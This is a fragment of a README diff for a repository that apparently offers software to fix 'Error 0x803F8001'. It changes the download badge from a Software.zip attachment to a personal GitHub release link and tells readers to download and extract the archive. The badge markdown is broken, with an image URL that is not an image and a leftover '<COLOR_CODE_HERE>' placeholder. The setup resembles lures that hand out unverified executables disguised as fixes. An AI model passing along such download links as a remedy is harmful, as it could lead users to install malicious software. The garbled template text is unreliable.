@@ -23,7 +23,7 @@ To install and run the software that will help you fix the "Error 0x803F8001", f
 
 1. Click on the download button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLOR_CODE_HERE>)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/damz001/Fixing-Error-0x803F8001/releases/tag/v2.0<COLOR_CODE_HERE>)](https://github.com/damz001/Fixing-Error-0x803F8001/releases/tag/v2.0)
 
 2. Once the software is downloaded, extract the files to a convenient location on your computer.
 
